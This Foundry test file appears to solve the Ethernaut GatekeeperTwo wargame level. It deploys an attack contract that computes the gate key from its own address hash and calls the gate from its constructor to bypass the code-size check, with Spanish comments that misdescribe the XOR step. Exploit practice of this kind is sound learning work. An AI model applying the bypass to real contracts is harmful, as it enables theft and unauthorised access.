pragma solidity ^0.8.17;

import "forge-std/Test.sol";

import "../../src/14_GatekeeperTwo/GatekeeperTwo.sol";

contract Attack {
    GatekeeperTwo public victim2;

    /*
    1. `address(this)`: Esto obtiene la dirección del contrato actual en Solidity.

    2. `abi.encodePacked(address(this))`: La función `abi.encodePacked` se utiliza
    para codificar los argumentos proporcionados en una serie de bytes sin relleno.
    En este caso, se está codificando la dirección del contrato actual.

    3. `keccak256(...)`: La función `keccak256` es una función de resumen criptográfico
    que calcula el valor hash Keccak-256 de los datos proporcionados. En este caso,
    calcula el valor hash de la dirección del contrato actual codificada.

    4. `uint64(bytes8(...))`: Aquí, se convierte el valor hash Keccak-256 en un valor
    de 8 bytes (64 bits). Esto se hace tomando los primeros 8 bytes del valor hash,
    lo que es efectivamente un recorte de 8 bytes del valor hash más largo.

    5. `^ type(uint64)./max`: Finalmente, se realiza una operación XOR (bitwise XOR)
    entre el valor resultante de 64 bits y el valor máximo que puede tomar un número
    de 64 bits. La operación XOR se utiliza para verificar si el valor resultante es
    igual al valor máximo de 64 bits.
    */

    constructor(address attacker) {
        victim2 = GatekeeperTwo(attacker);
        uint64 pass = uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ type(uint64).max;
        victim2.enter(bytes8(pass));
    }
}

contract GatekeeperTwo_test is Test {
    GatekeeperTwo public victim;
    address public attacker;

    function setUp() public {
        attacker = vm.addr(1);
        victim = new GatekeeperTwo();
        vm.deal(attacker, 1 ether);
    }

    function testExploit() public {
        vm.startPrank(attacker, attacker); // setting address and tx.origin
        Attack attack = new Attack(address(victim));
        vm.stopPrank();
        assertEq(victim.entrant(), attacker);
    }


}